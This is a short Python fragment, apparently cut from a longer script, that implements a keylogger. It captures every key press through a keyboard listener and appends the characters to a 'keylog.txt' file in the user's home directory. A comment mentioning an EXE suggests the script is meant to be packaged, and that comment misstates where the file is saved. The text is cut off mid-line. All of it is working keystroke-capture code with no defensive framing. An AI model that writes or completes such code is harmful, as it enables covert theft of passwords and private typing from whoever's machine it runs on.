# Save keystrokes to the same directory as the EXE/script
log_file = os.path.join(os.path.expanduser("~"), "keylog.txt")

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

listener = keyboard.Listener(on_press=on_pr
